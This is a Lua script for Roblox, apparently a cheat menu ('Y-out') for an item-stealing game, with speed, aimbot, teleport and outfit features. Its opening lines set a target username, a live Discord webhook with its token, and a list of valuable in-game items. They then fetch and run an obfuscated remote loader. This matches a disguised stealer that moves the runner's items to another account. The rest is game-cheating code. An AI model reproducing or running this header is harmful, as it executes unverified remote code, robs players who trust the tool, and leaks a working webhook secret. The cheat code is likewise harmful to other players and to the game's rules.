-- Mode: CUSTOM
getgenv().TARGET_USERNAME = "xande70"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1563088837461413968/kJLaBA3sqTY8hp-SzMiveXLL5TYZk58ECGiC6OtszoBQwmVp4MGRD7ezldsnVU0cZF2X"
getgenv().NORMAL_BRAINROTS = {
    ["Cash or Card"] = true,
    ["Cerberus"] = true,
    ["Burguro And Fryuro"] = true,
    ["Santa Hotspot"] = true,
    ["Spooketti Tualetti"] = true,
    ["Spooky Spooky Sahur"] = true,
    ["Panda Popanda"] = true,
    ["Sammyni Spookyni"] = true,
    ["Pogo Pogo Penguin"] = true,
    ["Polaroidini"] = true,
    ["Spooky and Pumpky"] = true,
    ["Pot Hotspot"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Pot Pumpkin"] = true,
    ["Noodle Noodle Poodle"] = true,
    ["Pop Pop Petalini"] = true,
    ["Garama and Madundung"] = true
}
getgenv().NORMAL_BASE_SKINS = {}
getgenv().NORMAL_GEARS = {}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)

task.spawn(function()
    -- A previous copy could set this flag and then stop while waiting for a
    -- game-specific object. Clear that stale state so a fixed copy can start.
    if _G.YoutRunning then
        warn("[Y-out] Instancia previa detectada. Se recomienda rejoin si hay comportamiento errÃ¡tico.")
    end
    _G.YoutRunning = false
    _G.__YoutMainOriginalPos = nil
    
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local UIS = game:GetService("UserInputService")
    local TS = game:GetService("TweenService")
    local Lighting = game:GetService("Lighting")
    local HS = game:GetService("HttpService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Workspace = game:GetService("Workspace")
    
    local LP = Players.LocalPlayer
    if not LP then
        local _lpConn
        _lpConn = Players.PlayerAdded:Connect(function(p) LP = p end)
        local _t0 = tick()
        while not LP and tick() - _t0 < 15 do task.wait(0.1) end
        if _lpConn then _lpConn:Disconnect() end
    end
    if not LP then
        warn("[Y-out] LocalPlayer no disponible en 15s. Abortando.")
        return
    end
    
    local pgui = LP:WaitForChild("PlayerGui", 20)
    if not pgui then
        warn("[Y-out] PlayerGui no cargÃ³ en 20s. Abortando.")
        return
    end
    
    local camera = Workspace.CurrentCamera
    
    _G.YoutRunning = true
    _G.YoutSession = (_G.YoutSession or 0) + 1
    local _mySession = _G.YoutSession
    
    local YOUT_LANGUAGE = "en"
    
    local YOUT_TRANSLATIONS = {
        es = { ["RESET ALL SETTINGS"]="RESTABLECER TODO", ["SETTINGS RESET"]="AJUSTES RESTABLECIDOS", ["CONFIRM?"]="Â¿CONFIRMAR?", ["ERROR"]="ERROR", ["Reset All Keybinds"]="RESTABLECER TECLAS", ["RESET"]="RESTABLECER", ["Keybinds"]="TECLAS", ["Carry Mode"]="MODO CARGAR", ["Lagger Mode"]="MODO LAG", ["Auto Left"]="AUTO IZQUIERDA", ["Auto Right"]="AUTO DERECHA", ["Auto Bat"]="AUTO BATE", ["TP BAT"]="TP BATE", ["Insta Reset"]="REINICIO RÃPIDO", ["TP Down"]="TP ABAJO", ["Drop Brainrot"]="SOLTAR BRAINROT", ["Hide GUI"]="OCULTAR MENÃš", ["Normal Speed"]="VELOCIDAD NORMAL", ["Carry Speed"]="VELOCIDAD CARGAR", ["Current Mode"]="MODO ACTUAL", ["ACTIVATE"]="ACTIVAR" },
        pt = { ["RESET ALL SETTINGS"]="REDEFINIR TUDO", ["SETTINGS RESET"]="CONFIGURAÃ‡Ã•ES REDEFINIDAS", ["CONFIRM?"]="CONFIRMAR?", ["ERROR"]="ERRO", ["Reset All Keybinds"]="REDEFINIR TECLAS", ["RESET"]="REDEFINIR", ["Keybinds"]="TECLAS", ["Carry Mode"]="MODO CARREGAR", ["Auto Left"]="AUTO ESQUERDA", ["Auto Right"]="AUTO DIREITA", ["Hide GUI"]="OCULTAR MENU", ["Normal Speed"]="VELOCIDADE NORMAL", ["Carry Speed"]="VELOCIDADE CARREGAR", ["ACTIVATE"]="ATIVAR" },
        fr = { ["RESET ALL SETTINGS"]="RÃ‰INITIALISER", ["SETTINGS RESET"]="PARAMÃˆTRES RÃ‰INITIALISÃ‰S", ["CONFIRM?"]="CONFIRMER ?", ["ERROR"]="ERREUR", ["Reset All Keybinds"]="RÃ‰INITIALISER LES TOUCHES", ["RESET"]="RÃ‰INITIALISER", ["Keybinds"]="RACCOURCIS", ["Carry Mode"]="MODE PORTER", ["Auto Left"]="AUTO GAUCHE", ["Auto Right"]="AUTO DROITE", ["Hide GUI"]="MASQUER LE MENU", ["Normal Speed"]="VITESSE NORMALE", ["Carry Speed"]="VITESSE PORTER", ["ACTIVATE"]="ACTIVER" },
        de = { ["RESET ALL SETTINGS"]="ALLES ZURÃœCKSETZEN", ["SETTINGS RESET"]="EINSTELLUNGEN ZURÃœCKGESETZT", ["CONFIRM?"]="BESTÃ„TIGEN?", ["ERROR"]="FEHLER", ["Reset All Keybinds"]="TASTEN ZURÃœCKSETZEN", ["RESET"]="ZURÃœCKSETZEN", ["Keybinds"]="TASTEN", ["Carry Mode"]="TRAGEMODUS", ["Auto Left"]="AUTO LINKS", ["Auto Right"]="AUTO RECHTS", ["Hide GUI"]="MENÃœ AUSBLENDEN", ["Normal Speed"]="NORMALE GESCHWINDIGKEIT", ["Carry Speed"]="TRAGEGESCHWINDIGKEIT", ["ACTIVATE"]="AKTIVIEREN" },
    }
    
    local function localizeYoutInterface(root)
        local dictionary = YOUT_TRANSLATIONS[YOUT_LANGUAGE]
        if not dictionary or not root then return end
        for _, object in ipairs(root:GetDescendants()) do
            if object:IsA("TextLabel") or object:IsA("TextButton") then
                local source = object:GetAttribute("YoutSourceText") or object.Text
                object:SetAttribute("YoutSourceText", source)
                local translated = dictionary[source]
                if translated then object.Text = translated end
            end
        end
    end
    
    local function youtTranslate(source)
        local dictionary = YOUT_TRANSLATIONS[YOUT_LANGUAGE]
        return (dictionary and dictionary[source]) or source
    end
    
    local _tick          = tick
    local _clamp         = math.clamp
    local _floor         = math.floor
    local _abs           = math.abs
    local _huge          = math.huge
    local _sqrt          = math.sqrt
    local _V3new         = Vector3.new
    local _V3zero        = Vector3.zero
    local _CFnew         = CFrame.new
    local _CFlookAt      = CFrame.lookAt
    local _RayParams_new = RaycastParams.new
    
    local _GetPlayersCached
    do
        local cache, cacheTime = nil, 0
        _GetPlayersCached = function()
            local now = _tick()
            if cache and now - cacheTime < 0.03 then return cache end
            cache = Players:GetPlayers()
            cacheTime = now
            return cache
        end
    end
    
    local function waitForCharReady(char, timeout)
        timeout = timeout or 5
        local deadline = _tick() + timeout
        while (not char) or (not char.Parent)
              or (not char:FindFirstChild("HumanoidRootPart"))
              or (not char:FindFirstChildOfClass("Humanoid")) do
            if _tick() > deadline then return false end
            task.wait(0.05)
        end
        return true
    end
    
    NS = 60
    CS = 29
    LAGGER_SPEED = 15
    LAGGER_CARRY_SPEED = 24.5
    MEDUSA_COOLDOWN = 25
    BAT_AIMBOT_SPEED = 58
    BYPASS_AIMBOT_SPEED = 60
    CONFIG_FILE = "Yout_" .. tostring(LP.UserId) .. ".json"
    BAT_V2_HIT_DIST = 4.5
    _isDraggingButton = false
    
    -- [BATV2 ADDED] BatV2 constants
    BATV2_SPEED = 60
    BATV2_DIST = 1.0
    BATV2_HEIGHT = 1.5
    BATV2_V_OFF = 0.0
    BATV2_HIT_DIST = 4.5
    BATV2_SWING_CD = 0.08
    
    backgroundIndex = 1
    backgroundImages = {
        "81747659288399", -- âœ… ONLY background image
    }
    
    backgroundImageTransparency = 0
    backgroundMode = "Background 1"
    backgroundSelectorLabel = nil
    floatingButtonScale = 1
    _floatingUIScales = {}
    
    local COLOR_THEMES = {
        ["White"] = Color3.fromRGB(245, 245, 250),
        ["Red"] = Color3.fromRGB(255, 60, 60),
    }
    
    currentColorTheme = "White"
    selectedColor = COLOR_THEMES["White"]
    
    function getThemeColor() return selectedColor end
    
    function youtGradient(c)
        return ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, c:Lerp(Color3.new(1,1,1), 0.55)),
            ColorSequenceKeypoint.new(0.45, c),
            ColorSequenceKeypoint.new(1.00, c:Lerp(Color3.new(0,0,0), 0.35)),
        })
    end
    
    function youtGradientSoft(c)
        return ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, c:Lerp(Color3.new(1,1,1), 0.75)),
            ColorSequenceKeypoint.new(0.50, c:Lerp(Color3.new(1,1,1), 0.25)),
            ColorSequenceKeypoint.new(1.00, c:Lerp(Color3.new(0,0,0), 0.15)),
        })
    end
    
    function youtGradientDark(c)
        return ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, c:Lerp(Color3.fromRGB(0,0,0), 0.35)),
            ColorSequenceKeypoint.new(0.55, c:Lerp(Color3.fromRGB(0,0,0), 0.65)),
            ColorSequenceKeypoint.new(1.00, c:Lerp(Color3.fromRGB(0,0,0), 0.80)),
        })
    end
    
    function applyYoutGradientToLabel(label, c)
        if not label then return end
        local grad = label:FindFirstChildOfClass("UIGradient")
        if not grad then
            grad = Instance.new("UIGradient", label)
        end
        grad.Rotation = 0
        grad.Color = youtGradient(c)
    end
    
    local _lastThemeUpdate = 0
    local _lastThemeColor = nil
    
    function applyColorTheme(themeName)
        local color = COLOR_THEMES[themeName]
        if not color then return end
        currentColorTheme = themeName
        selectedColor = color
        updateAllUIThemeColors(color)
        saveAllSettings()
    end
    
    _uicStroke = nil
    _uicAvatarStroke = nil
    _uicHandle = nil
    _uicLine = nil
    
    function updateAllUIThemeColors(color)
        local now = _tick()
        if color == _lastThemeColor and now - _lastThemeUpdate < 0.1 then return end
        _lastThemeUpdate = now
        _lastThemeColor = color
    
        if progressFill then
            progressFill.BackgroundColor3 = color
            local grad = progressFill:FindFirstChildOfClass("UIGradient")
            if grad then
                grad.Color = youtGradient(color)
                grad.Rotation = 0
            end
        end
        if pbFrame then
            local border = pbFrame:FindFirstChild("OuterStroke") or pbFrame:FindFirstChildOfClass("UIStroke")
            if border then border.Color = color end
            local fpsNeon = pbFrame:FindFirstChild("FPSNeon", true)
            if fpsNeon then fpsNeon.TextColor3 = color end
            local pingNeon = pbFrame:FindFirstChild("PingNeon", true)
            if pingNeon then pingNeon.TextColor3 = color end
            local divider = pbFrame:FindFirstChild("Divider", true)
            if divider and divider:IsA("Frame") then divider.BackgroundColor3 = color end
        end
    
        if _uicStroke then _uicStroke.Color = color end
        if _uicAvatarStroke then _uicAvatarStroke.Color = color end
        if _uicHandle then _uicHandle.TextColor3 = color end
        if _uicLine then _uicLine.BackgroundColor3 = color end
    
        local function searchAndUpdateText(parent)
            for _, child in ipairs(parent:GetDescendants()) do
                if child:IsA("TextLabel") then
                    if child.Name == "DiscordText" or child.Name == "SpeedLabel" then
                        child.TextColor3 = Color3.fromRGB(0, 0, 0)
                    end
                end
                if child:IsA("UIStroke") then
                    if child.Color == Color3.fromRGB(180, 180, 190) then child.Color = color end
                end
            end
        end
        if gui then searchAndUpdateText(gui) end
        if tpBatFloatingButton then
            paintFloatingBtn(tpBatFloatingButton:FindFirstChild("Frame"), batDesyncTpEnabled)
        end
        if _G.__YoutBatV2Frame then
            paintFloatingBtn(_G.__YoutBatV2Frame, batV2Enabled)
        end
        if main then
            local titleFrame = main:FindFirstChild("Frame")
            if titleFrame then
                for _, child in ipairs(titleFrame:GetDescendants()) do
                    if child:IsA("UIStroke") and child.Color == Color3.fromRGB(180, 180, 190) then
                        child.Color = color
                    end
                end
            end
        end
        if colorSelectorLabel then
            colorSelectorLabel.Text = currentColorTheme
            colorSelectorLabel.TextColor3 = color
        end
    
        if _G._youtStealSlide then
            _G._youtStealSlide.BackgroundColor3 = color
            local sg = _G._youtStealSlide:FindFirstChildOfClass("UIGradient")
            if sg then sg.Color = youtGradient(color) end
            local ss = _G._youtStealSlide:FindFirstChildOfClass("UIStroke")
            if ss then ss.Color = color end
        end
    
        if miniBtn then
            local stroke = miniBtn:FindFirstChildOfClass("UIStroke")
            if stroke then stroke.Color = color end
        end
    
        if MobilePanel then
            for _, btn in ipairs(MobilePanel:GetChildren()) do
                if btn:IsA("TextButton") and btn:FindFirstChild("BtnGrad") then
                    paintFloatingBtn(btn, btn:GetAttribute("MobActive") == true)
                end
            end
        end
    end
    
    local HOMERO_CFG = {
        body = { 10725826963, 86500008, 86500054, 86500036, 86500064, 86500078 },
        aplicarCuerpo = true,
        items = {
            { id = 103227869700418, offset = _CFnew(0,0,0) },
            { id = 84952305140948,   offset = _CFnew(0,0,0) },
            { id = 122465238537030,  offset = _CFnew(0,0,0) },
        },
        shirt = nil,
        pants = "rbxassetid://78591690208112",
        skinColor = Color3.fromRGB(234,184,146),
        headColor = Color3.fromRGB(0,0,0),
    }
    
    local TAG = "LocalOutfit_"
    
    local function loadObjects(id)
        local ok, res = pcall(function()
            return game:GetObjects("rbxassetid://" .. tostring(id))
        end)
        if ok and typeof(res) == "table" and #res > 0 then return res end
        ok, res = pcall(function()
            return game:GetService("InsertService"):LoadAsset(id)
        end)
        if ok and res then return { res } end
        return nil
    end
    
    local function collectParts(objs)
        local out = {}
        for _, o in ipairs(objs) do
            if o:IsA("BasePart") then out[#out + 1] = o end
            for _, d in ipairs(o:GetDescendants()) do
                if d:IsA("BasePart") then out[#out + 1] = d end
            end
        end
        return out
    end
    
    local function findAtt(char, name)
        for _, p in ipairs(char:GetDescendants()) do
            if p:IsA("Attachment") and p.Name == name and p.Parent:IsA("BasePart") then
                return p
            end
        end
    end
    
    local function applyBody(char)
        local total = 0
        for _, id in ipairs(HOMERO_CFG.body) do
            local objs = loadObjects(id)
            if objs then
                for _, mp in ipairs(collectParts(objs)) do
                    local orig = char:FindFirstChild(mp.Name)
                    if orig and orig:IsA("BasePart") then
                        local c = mp:Clone()
                        c.Name = TAG .. "body_" .. mp.Name
                        c.CanCollide = false
                        c.Anchored = false
                        c.Massless = true
                        c.Size = orig.Size
                        c.CFrame = orig.CFrame
                        c.Parent = char
                        local w = Instance.new("WeldConstraint")
                        w.Part0 = orig
                        w.Part1 = c
                        w.Parent = c
                        if orig:GetAttribute("YoutOutfitOriginalTransparency") == nil then
                            orig:SetAttribute("YoutOutfitOriginalTransparency", orig.Transparency)
                        end
                        orig.Transparency = 1
                        total = total + 1
                    end
                end
                for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
            end
        end
        return total
    end
    
    local function attachItem(char, entry)
        local objs = loadObjects(entry.id)
        if not objs then return false end
    
        local handle
        for _, p in ipairs(collectParts(objs)) do
            if p.Name == "Handle" then handle = p; break end
            if not handle then handle = p end
        end
        if not handle then
            for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
            return false
        end
    
        local H = handle:Clone()
        for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
    
        H.Name = TAG .. "item_" .. tostring(entry.id)
        H.CanCollide = false
        H.Anchored = false
        H.Massless = true
    
        local wrap = H:FindFirstChildWhichIsA("WrapLayer")
        local target, c0, c1
    
        if wrap then
            target = char:FindFirstChild("UpperTorso")
                  or char:FindFirstChild("Torso")
                  or char:FindFirstChild("HumanoidRootPart")
            c0 = entry.offset or _CFnew()
            c1 = _CFnew()
        else
            local hAtt = H:FindFirstChildOfClass("Attachment")
            local bAtt = hAtt and findAtt(char, hAtt.Name)
            if bAtt then
                target = bAtt.Parent
                c0 = bAtt.CFrame * (entry.offset or _CFnew())
                c1 = hAtt.CFrame
            else
                target = char:FindFirstChild("Head")
                c0 = entry.offset or _CFnew(0, 1.4, 0)
                c1 = _CFnew()
            end
        end
    
        if not target then H:Destroy(); return false end
    
        H.CFrame = target.CFrame * c0 * c1:Inverse()
        H.Parent = char
    
        local w = Instance.new("Weld")
        w.Part0 = target
        w.Part1 = H
        w.C0 = c0
        w.C1 = c1
        w.Parent = H
        return true
    end
    
    function applyHomeroOutfit(char)
        if not char then char = LP.Character end
        if not char then return end
        char:WaitForChild("Humanoid", 10)
        char:WaitForChild("Head", 10)
        task.wait(0.4)
    
        for _, d in ipairs(char:GetChildren()) do
            if d.Name:sub(1, #TAG) == TAG then pcall(function() d:Destroy() end) end
        end
    
        if HOMERO_CFG.skinColor then
            local bc = char:FindFirstChildWhichIsA("BodyColors") or Instance.new("BodyColors")
            bc.HeadColor3 = HOMERO_CFG.headColor or HOMERO_CFG.skinColor
            bc.TorsoColor3 = HOMERO_CFG.skinColor
            bc.LeftArmColor3, bc.RightArmColor3 = HOMERO_CFG.skinColor, HOMERO_CFG.skinColor
            bc.LeftLegColor3, bc.RightLegColor3 = HOMERO_CFG.skinColor, HOMERO_CFG.skinColor
            bc.Parent = char
        end
    
        for _, a in ipairs(char:GetChildren()) do
            if a:IsA("Accessory") then
                local h = a:FindFirstChild("Handle")
                if h then h.Transparency = 1 end
            end
        end
    
        if HOMERO_CFG.shirt then
            local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
            s.Name = "Shirt"
            s.ShirtTemplate = HOMERO_CFG.shirt
            s.Parent = char
        end
        if HOMERO_CFG.pants then
            local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
            p.Name = "Pants"
            p.PantsTemplate = HOMERO_CFG.pants
            p.Parent = char
        end
        if HOMERO_CFG.aplicarCuerpo then applyBody(char) end
        for _, e in ipairs(HOMERO_CFG.items) do attachItem(char, e) end
    end
    
    local _originalAppearance = nil
    
    local function captureOriginalAppearance(char)
        if not char or _originalAppearance then return end
        local data = {
            bodyColors = nil,
            shirt = nil,
            pants = nil,
            headMesh = nil,
            headTexture = nil,
        }
        local bc = char:FindFirstChildWhichIsA("BodyColors")
        if bc then
            data.bodyColors = {
                head = bc.HeadColor3,
                torso = bc.TorsoColor3,
                leftArm = bc.LeftArmColor3,
                rightArm = bc.RightArmColor3,
                leftLeg = bc.LeftLegColor3,
                rightLeg = bc.RightLegColor3,
            }
        end
        local sh = char:FindFirstChildWhichIsA("Shirt")
        if sh then data.shirt = sh.ShirtTemplate end
        local pa = char:FindFirstChildWhichIsA("Pants")
        if pa then data.pants = pa.PantsTemplate end
        local head = char:FindFirstChild("Head")
        if head then
            local sm = head:FindFirstChildWhichIsA("SpecialMesh")
            if sm and sm.MeshType == Enum.MeshType.FileMesh then
                data.headMesh = sm.MeshId
                data.headTexture = sm.TextureId
            end
        end
        _originalAppearance = data
    end
    
    local function clearPreviousOutfitAssets(char)
        if not char then return end
        for _, child in ipairs(char:GetChildren()) do
            if child.Name:sub(1, #TAG) == TAG
            or child.Name == "AuFfitAccessory"
            or child.Name == "Korblox_RightLeg" then
                pcall(function() child:Destroy() end)
            elseif child:IsA("CharacterMesh") and child.BodyPart == Enum.BodyPart.Head then
                pcall(function() child:Destroy() end)
            end
        end
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                local originalTransparency = part:GetAttribute("YoutOutfitOriginalTransparency")
                if originalTransparency ~= nil then
                    part.Transparency = originalTransparency
                    part:SetAttribute("YoutOutfitOriginalTransparency", nil)
                end
                local originalLocalTransparency = part:GetAttribute("YoutOutfitOriginalLocalTransparency")
                if originalLocalTransparency ~= nil then
                    part.LocalTransparencyModifier = originalLocalTransparency
                    part:SetAttribute("YoutOutfitOriginalLocalTransparency", nil)
                end
            end
        end
        if _originalAppearance and _originalAppearance.bodyColors then
            local bc = char:FindFirstChildWhichIsA("BodyColors") or Instance.new("BodyColors")
            local o = _originalAppearance.bodyColors
            bc.HeadColor3, bc.TorsoColor3 = o.head, o.torso
            bc.LeftArmColor3, bc.RightArmColor3 = o.leftArm, o.rightArm
            bc.LeftLegColor3, bc.RightLegColor3 = o.leftLeg, o.rightLeg
            bc.Parent = char
        end
        local head = char:FindFirstChild("Head")
        if head and head:IsA("MeshPart") and head:GetAttribute("YoutOutfitModifiedMeshPart") then
            pcall(function()
                head.MeshId = head:GetAttribute("YoutOutfitOriginalMeshId") or ""
                head.TextureID = head:GetAttribute("YoutOutfitOriginalTextureId") or ""
            end)
            head:SetAttribute("YoutOutfitModifiedMeshPart", nil)
            head:SetAttribute("YoutOutfitOriginalMeshId", nil)
            head:SetAttribute("YoutOutfitOriginalTextureId", nil)
        elseif head then
            local specialMesh = head:FindFirstChildWhichIsA("SpecialMesh")
            if specialMesh and specialMesh:GetAttribute("YoutOutfitCreatedMesh") then
                specialMesh:Destroy()
            elseif specialMesh and specialMesh:GetAttribute("YoutOutfitModifiedMesh") then
                specialMesh.MeshId = specialMesh:GetAttribute("YoutOutfitOriginalMeshId") or ""
                specialMesh.TextureId = specialMesh:GetAttribute("YoutOutfitOriginalTextureId") or ""
                specialMesh:SetAttribute("YoutOutfitModifiedMesh", nil)
                specialMesh:SetAttribute("YoutOutfitOriginalMeshId", nil)
                specialMesh:SetAttribute("YoutOutfitOriginalTextureId", nil)
            end
        end
    end
    
    local function applyNoOutfit(char)
        if not char then char = LP.Character end
        if not char then return end
        for _, d in ipairs(char:GetChildren()) do
            if d.Name:sub(1, #TAG) == TAG then pcall(function() d:Destroy() end) end
        end
        local oldAcc = char:FindFirstChild("AuFfitAccessory")
        if oldAcc then pcall(function() oldAcc:Destroy() end) end
        local oldKorblox = char:FindFirstChild("Korblox_RightLeg")
        if oldKorblox then pcall(function() oldKorblox:Destroy() end) end
        for _, d in ipairs(char:GetChildren()) do
            if d:IsA("CharacterMesh") and d.BodyPart == Enum.BodyPart.Head then
                pcall(function() d:Destroy() end)
            end
        end
        local head = char:FindFirstChild("Head")
        if head then
            head.Transparency = 0
            head.CanCollide = true
            head.LocalTransparencyModifier = 0
            local face = head:FindFirstChild("face")
            if face then face.Transparency = 0 end
            local sm = head:FindFirstChildWhichIsA("SpecialMesh")
            if sm then
                if _originalAppearance and _originalAppearance.headMesh then
                    sm.MeshId = _originalAppearance.headMesh
                    sm.TextureId = _originalAppearance.headTexture or ""
                else
                    pcall(function() sm:Destroy() end)
                end
            end
        end
        pcall(function()
            local neck = char:FindFirstChild("Neck")
            if neck then neck.Enabled = true end
        end)
        for _, partName in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
            local limb = char:FindFirstChild(partName)
            if limb then limb.Transparency = 0 end
        end
        if _originalAppearance and _originalAppearance.bodyColors then
            local bc = char:FindFirstChildWhichIsA("BodyColors") or Instance.new("BodyColors")
            local o = _originalAppearance.bodyColors
            bc.HeadColor3 = o.head
            bc.TorsoColor3 = o.torso
            bc.LeftArmColor3 = o.leftArm
            bc.RightArmColor3 = o.rightArm
            bc.LeftLegColor3 = o.leftLeg
            bc.RightLegColor3 = o.rightLeg
            bc.Parent = char
        end
        if _originalAppearance and _originalAppearance.shirt then
            local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
            s.ShirtTemplate = _originalAppearance.shirt
            s.Parent = char
        end
        if _originalAppearance and _originalAppearance.pants then
            local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
            p.PantsTemplate = _originalAppearance.pants
            p.Parent = char
        end
        for _, a in ipairs(char:GetChildren()) do
            if a:IsA("Accessory") then
                local h = a:FindFirstChild("Handle")
                if h then h.Transparency = 0 end
            end
        end
    end
    
    local OUTFITS = {
        { label = "OFF", customApply = applyNoOutfit },
        { accessory = 10159600649, offset = _V3new(0, 1, -0.2), shirt = "http://www.roblox.com/asset/?id=9683332638", pants = "http://www.roblox.com/asset/?id=93182020184041", headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918 ", korblox = "none", label = "Outfit 1", headlessKorblox = true },
        { accessory = 1744060292, offset = _V3new(0, 1.3, -0.2), shirt = "http://www.roblox.com/asset/?id=9683332638", pants = "http://www.roblox.com/asset/?id=93182020184041", headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918 ", korblox = "none", label = "Outfit 2", headlessKorblox = true },
        { accessory = 8349240186, offset = _V3new(0, 0.9, 0), shirt = "http://www.roblox.com/asset/?id=11926549070", pants = "http://www.roblox.com/asset/?id=13189494471", headMesh = "https://assetdelivery.roblox.com/v1/asset/?id=16673245747", headTexture = nil, korblox = "none", label = "Outfit 3", headlessKorblox = true },
        { accessory = 121097973925756, offset = _V3new(0, 0.9, 0), shirt = "http://www.roblox.com/asset/?id=123181702116947", pants = "http://www.roblox.com/asset/?id=93330291631062", headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918 ", korblox = "none", label = "Outfit 4", headlessKorblox = true },
        { label = "Homero Chino", customApply = applyHomeroOutfit },
    }
    local currentOutfitIndex = 1
    local outfitSelectorLabel = nil
    
    local function loadObjectsStd(id)
        local ok, res = pcall(function() return game:GetObjects("rbxassetid://" .. tostring(id)) end)
        if ok and typeof(res) == "table" and #res > 0 then return res end
        ok, res = pcall(function() return game:GetService("InsertService"):LoadAsset(id) end)
        if ok and res then return {res} end
        return nil
    end
    
    local function applyHeadlessKorblox(char)
        if not char then return end
        pcall(function() LP.CharacterAvatarType = Enum.AvatarType.R6 end)
        local head = char:FindFirstChild("Head")
        if head then
            if head:GetAttribute("YoutOutfitOriginalTransparency") == nil then
                head:SetAttribute("YoutOutfitOriginalTransparency", head.Transparency)
                head:SetAttribute("YoutOutfitOriginalLocalTransparency", head.LocalTransparencyModifier)
            end
            head.Transparency = 1
            head.CanCollide = false
            head.LocalTransparencyModifier = 1
            local face = head:FindFirstChild("face")
            if face then face.Transparency = 1 end
        end
        pcall(function()
            local neck = char:FindFirstChild("Neck")
            if neck then neck.Enabled = false end
        end)
        for _, v in pairs(char:GetChildren()) do
            if v:IsA("Accessory") then
                local w = v:FindFirstChildWhichIsA("Weld") or v:FindFirstChildWhichIsA("WeldConstraint") or v:FindFirstChildWhichIsA("Motor6D")
                if w then
                    local p0, p1 = w.Part0, w.Part1
                    if (p0 and p0.Name == "Head") or (p1 and p1.Name == "Head") then
                        for _, part in ipairs(v:GetDescendants()) do
                            if part:IsA("BasePart") then
                                if part:GetAttribute("YoutOutfitOriginalTransparency") == nil then
                                    part:SetAttribute("YoutOutfitOriginalTransparency", part.Transparency)
                                    part:SetAttribute("YoutOutfitOriginalLocalTransparency", part.LocalTransparencyModifier)
                                end
                                part.Transparency = 1
                                part.LocalTransparencyModifier = 1
                            end
                        end
                    end
                end
            end
        end
        local rightLegConfig = { id = "rbxassetid://139607718", targetBodyPart = "RightUpperLeg", partsToHide = {"RightUpperLeg", "RightLowerLeg", "RightFoot"}, scale = _V3new(1, 1, 1), offset = _CFnew(0, 0, 0) }
        local targetPart = char:FindFirstChild(rightLegConfig.targetBodyPart)
        if targetPart then
            local oldAsset = char:FindFirstChild("Korblox_RightLeg")
            if oldAsset then oldAsset:Destroy() end
            for _, partName in ipairs(rightLegConfig.partsToHide) do
                local limb = char:FindFirstChild(partName)
                if limb and limb:IsA("BasePart") then
                    if limb:GetAttribute("YoutOutfitOriginalTransparency") == nil then
                        limb:SetAttribute("YoutOutfitOriginalTransparency", limb.Transparency)
                    end
                    limb.Transparency = 1
                end
            end
            local success, objects = pcall(function() return game:GetObjects(rightLegConfig.id) end)
            if success and objects and #objects > 0 then
                local assetModel = objects[1]
                assetModel.Name = "Korblox_RightLeg"
                local mainMesh = assetModel:IsA("BasePart") and assetModel or assetModel:FindFirstChildWhichIsA("BasePart", true)
                if mainMesh then
                    mainMesh.Size = mainMesh.Size * rightLegConfig.scale
                    mainMesh.CanCollide = false
                    mainMesh.CFrame = targetPart.CFrame * rightLegConfig.offset
                    local weld = Instance.new("WeldConstraint")
                    weld.Part0 = targetPart
                    weld.Part1 = mainMesh
                    weld.Parent = mainMesh
                    assetModel.Parent = char
                end
            end
        end
    end
    
    function applyOutfitByIndex(index)
        local cfg = OUTFITS[index]
        if not cfg then return end
        local char = LP.Character
        if not char then return end
        clearPreviousOutfitAssets(char)
        if cfg.customApply then
            cfg.customApply(char)
            if outfitSelectorLabel then outfitSelectorLabel.Text = cfg.label end
            return
        end
        char:WaitForChild("Head", 5)
        local head = char:FindFirstChild("Head")
        if not head then return end
        for _, d in ipairs(char:GetChildren()) do
            if d:IsA("CharacterMesh") and d.BodyPart == Enum.BodyPart.Head then
                pcall(function() d:Destroy() end)
            end
        end
        local done = false
        if head:IsA("MeshPart") then
            done = pcall(function()
                if not head:GetAttribute("YoutOutfitModifiedMeshPart") then
                    head:SetAttribute("YoutOutfitOriginalMeshId", head.MeshId)
                    head:SetAttribute("YoutOutfitOriginalTextureId", head.TextureID)
                    head:SetAttribute("YoutOutfitModifiedMeshPart", true)
                end
                head.MeshId = cfg.headMesh
                head.TextureID = cfg.headTexture or ""
            end)
        end
        if not done then
            local sm = head:FindFirstChildWhichIsA("SpecialMesh")
            if not sm then
                sm = Instance.new("SpecialMesh")
                sm:SetAttribute("YoutOutfitCreatedMesh", true)
            elseif not sm:GetAttribute("YoutOutfitModifiedMesh") then
                sm:SetAttribute("YoutOutfitOriginalMeshId", sm.MeshId)
                sm:SetAttribute("YoutOutfitOriginalTextureId", sm.TextureId)
                sm:SetAttribute("YoutOutfitModifiedMesh", true)
            end
            sm.Parent = head
            sm.MeshType = Enum.MeshType.FileMesh
            sm.MeshId = cfg.headMesh
            sm.TextureId = cfg.headTexture or ""
        end
        if cfg.shirt then
            local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
            s.Name = "Shirt"
            s.ShirtTemplate = cfg.shirt
            s.Parent = char
        end
        if cfg.pants then
            local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
            p.Name = "Pants"
            p.PantsTemplate = cfg.pants
            p.Parent = char
        end
        local old = char:FindFirstChild("AuFfitAccessory")
        if old then old:Destroy() end
        if cfg.accessory and head then
            local objs = loadObjectsStd(cfg.accessory)
            if objs then
                local handle
